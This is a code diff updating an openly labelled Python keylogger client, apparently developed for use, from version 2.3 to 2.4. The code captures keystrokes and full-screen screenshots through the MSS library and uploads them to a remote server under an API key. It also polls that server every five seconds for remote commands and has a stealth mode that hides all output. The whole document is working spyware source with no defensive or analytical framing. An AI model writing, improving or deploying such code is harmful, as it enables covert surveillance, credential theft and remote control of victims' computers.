@@ -1,37 +1,36 @@
 #!/usr/bin/env python3
 """
-Keylogger Client v2.3 - Compatible backend actuel
-Ajout : Capture d'écran et Commande à distance (Polling)
+Keylogger Client v2.4 - Compatible backend actuel
+Utilise MSS (plus stable en PyInstaller) pour la capture d'écran
 """
 
 import sys
 import time
 import socket
 import subprocess
-import threading # NOUVEAU
+import threading
+from io import BytesIO # Pour la gestion du buffer d'image en mémoire
 
 # Installation automatique des dépendances
 try:
     from pynput import keyboard
     import requests
-    # NOUVEAU: Importation de Pillow pour la capture d'écran
-    from PIL import ImageGrab
-    from io import BytesIO
+    # Utilisation de MSS pour la capture d'écran (plus fiable que Pillow en mode compilé)
+    import mss
 except ImportError:
-    print("[!] Installation des dépendances (pynput, requests, Pillow)...")
+    print("[!] Installation des dépendances (pynput, requests, mss)...")
     try:
+        # NOTE: Nous installons 'mss' à la place de 'Pillow'
         subprocess.check_call([
             sys.executable, "-m", "pip", "install",
-            "--break-system-packages", "-q", "pynput", "requests", "Pillow"
+            "--break-system-packages", "-q", "pynput", "requests", "mss" 
         ])
         from pynput import keyboard
         import requests
-        from PIL import ImageGrab
-        from io import BytesIO
-        print("[✓] Dépendances installées")
+        import mss
     except Exception as e:
         print(f"[✗] Erreur d'installation: {e}")
-        print("[!] Installez manuellement: pip3 install --break-system-packages pynput requests Pillow")
+        print("[!] Installez manuellement: pip3 install --break-system-packages pynput requests mss")
         sys.exit(1)
 
 
@@ -41,16 +40,13 @@ class KeyloggerClient:
         self.api_key = api_key
         self.stealth = stealth
 
-        # --- CONFIGURATION LOGS (INCHANGÉE) ---
         self.buffer = []
-        self.buffer_size = 50        
+        self.buffer_size = 50 
         self.last_send = time.time()
-        self.send_interval = 3       
+        self.send_interval = 3 
         self.send_lock = False
         self.machine_id = socket.gethostname()
-        
-        # --- CONFIGURATION COMMANDES (NOUVEAU) ---
-        self.COMMAND_POLLING_INTERVAL = 5 # Vérifie les commandes toutes les 5 secondes
+        self.COMMAND_POLLING_INTERVAL = 5 
 
         if not self.stealth:
             print("[✓] Keylogger démarré")
@@ -62,9 +58,6 @@ class KeyloggerClient:
     # PARTIE 1 & 2 : KEYLOGGER & ENVOI (INCHANGÉ)
     # ------------------------------------------------------------------ #
     
-    # [Toutes les méthodes _events_to_logs, send_keys, _add_event, on_press, on_release restent ici]
-    # NOTE: J'ai omis le corps de ces méthodes pour la concision, mais elles doivent être conservées.
-
     def _events_to_logs(self, events):
         """Re-construit une chaîne 'logs' compatible avec le backend actuel."""
         logs_str = ""
@@ -98,7 +91,7 @@ class KeyloggerClient:
             }
             headers = {
                 "Content-Type": "application/json",
-                "User-Agent": "KeyloggerClient/2.3",
+                "User-Agent": "KeyloggerClient/2.4",
                 "X-API-Key": self.api_key,
             }
 
@@ -155,7 +148,6 @@ class KeyloggerClient:
 
     def on_press(self, key):
         """Appelé à chaque pression de touche."""
-        # Logique de on_press (invariée)
         try:
             if hasattr(key, "char") and key.char is not None:
                 self._add_event("char", key.char)
@@ -199,7 +191,7 @@ class KeyloggerClient:
 
         except Exception as e:
             if not self.stealth:
-                print(f"\n[✗] Erreur capture: {e}")
+                print(f"\n[✗] Erreur capture clavier: {e}")
 
     def on_release(self, key):
         """Appelé au relâchement d'une touche."""
@@ -208,56 +200,58 @@ class KeyloggerClient:
             return False
 
     # ------------------------------------------------------------------ #
-    # PARTIE 3 : CAPTURE ET ENVOI D'ÉCRAN (NOUVEAU)
+    # PARTIE 3 : CAPTURE ET ENVOI D'ÉCRAN (MISE À JOUR AVEC MSS)
     # ------------------------------------------------------------------ #
     def take_and_upload_screenshot(self):
-        """Capture l'écran et envoie l'image au serveur."""
+        """Capture l'écran via MSS et envoie l'image au serveur."""
         if not self.stealth:
-            print("\n[INFO] Exécution de la capture d'écran...")
+            print("\n[INFO] Exécution de la capture d'écran (via MSS)...")
             
         try:
-            # 1. Capture l'écran entier
-            image = ImageGrab.grab()
+            # 1. Capture l'écran entier via MSS
+            with mss.mss() as sct:
+                monitor = sct.monitors[1] # Moniteur principal (index 1)
+                sct_img = sct.grab(monitor)
             
-            # 2. Sauvegarde l'image dans un buffer mémoire (plus discret)
-            img_buffer = BytesIO()
-            # Qualité réduite pour un envoi plus rapide
-            image.save(img_buffer, format='JPEG', optimize=True, quality=75) 
-            img_buffer.seek(0)
+                # 2. Sauvegarde l'image dans un buffer mémoire (format PNG/JPEG)
+                img_buffer = BytesIO()
+                # Enregistre directement le buffer d'image de MSS au format JPEG
+                sct.to_bytes(sct_img.rgb, sct_img.size, output=img_buffer, format='jpeg', quality=75)
+                img_buffer.seek(0)
             
-            # 3. Prépare et envoie la requête multipart/form-data
-            url = f"{self.server_url}/upload_screen"
-            headers = {"X-API-Key": self.api_key}
-            
-            files = {
-                'file': ('screen.jpg', img_buffer, 'image/jpeg')
-            }
-            data = {
-                'machine': self.machine_id
-            }
-            
-            resp = requests.post(url, headers=headers, data=data, files=files, timeout=30)
-            
-            if not self.stealth and resp.status_code == 200:
-                print("\n[✓] Capture d'écran envoyée.")
-            
+                # 3. Prépare et envoie la requête multipart/form-data
+                url = f"{self.server_url}/upload_screen"
+                headers = {"X-API-Key": self.api_key}
+                
+                files = {
+                    'file': ('screen.jpg', img_buffer, 'image/jpeg')
+                }
+                data = {
+                    'machine': self.machine_id
+                }
+                
+                resp = requests.post(url, headers=headers, data=data, files=files, timeout=30)
+                
+                if not self.stealth and resp.status_code == 200:
+                    print("\n[✓] Capture d'écran envoyée (via MSS).")
+                
         except requests.exceptions.RequestException:
-            # Ignorer les erreurs de connexion en mode silencieux
-            pass
+            pass # Ignorer les erreurs de connexion en mode silencieux
         except Exception as e:
             if not self.stealth:
-                print(f"\n[✗] Erreur lors de la capture/envoi: {e}")
+                # Afficher l'erreur pour le debug, même si on ignore en mode furtif
+                print(f"\n[✗] Erreur lors de la capture/envoi (MSS): {e}")
             pass
 
+
     # ------------------------------------------------------------------ #
-    # PARTIE 4 : VÉRIFICATION DES COMMANDES (NOUVEAU)
+    # PARTIE 4 : VÉRIFICATION DES COMMANDES (INCHANGÉ)
     # ------------------------------------------------------------------ #
     def check_command(self):
         """Interroge le serveur pour une commande en attente."""
         
-        # Le timer se rappelle lui-même
         self._command_timer = threading.Timer(self.COMMAND_POLLING_INTERVAL, self.check_command)
-        self._command_timer.daemon = True # Permet au programme de se fermer si la boucle principale s'arrête
+        self._command_timer.daemon = True 
         self._command_timer.start()
         
         url = f"{self.server_url}/get_command"
@@ -269,7 +263,7 @@ class KeyloggerClient:
                 "X-API-Key": self.api_key
             }
             response = requests.post(url, json=payload, headers=headers, timeout=5)
-            response.raise_for_status() # Lève une exception si le code est 4xx ou 5xx
+            response.raise_for_status() 
             
             json_response = response.json()
             command = json_response.get("command")
@@ -285,7 +279,7 @@ class KeyloggerClient:
 
 
     # ------------------------------------------------------------------ #
-    # BOUCLE PRINCIPALE (MODIFIÉE)
+    # BOUCLE PRINCIPALE (INCHANGÉE)
     # ------------------------------------------------------------------ #
     def start(self):
         """Démarre l'écoute du clavier et les tâches en arrière-plan."""
@@ -293,7 +287,6 @@ class KeyloggerClient:
             print("[!] Appuyez sur ESC pour arrêter en mode debug")
             print("-" * 50)
 
-        # Ping serveur (invarié)
         try:
             r = requests.get(f"{self.server_url}/api/ping", timeout=5)
             if not self.stealth:
@@ -304,25 +297,21 @@ class KeyloggerClient:
         except Exception as e:
             if not self.stealth:
                 print("[!] Impossible de joindre le serveur (buffer local)")
-                print(f"    Erreur: {e}")
+                print(f"     Erreur: {e}")
 
-        # Démarrage des tâches en arrière-plan (Polling des commandes)
         if not self.stealth:
             print(f"[✓] Démarrage du polling des commandes (toutes les {self.COMMAND_POLLING_INTERVAL}s)")
         self.check_command() 
         
-        # Démarrage de l'écoute du clavier (bloque le thread)
         with keyboard.Listener(
             on_press=self.on_press,
             on_release=self.on_release
         ) as listener:
             listener.join()
 
-        # Nettoyage
         if hasattr(self, '_command_timer'):
             self._command_timer.cancel()
 
-        # Envoi du reste
         if self.buffer:
             self.send_keys()
 
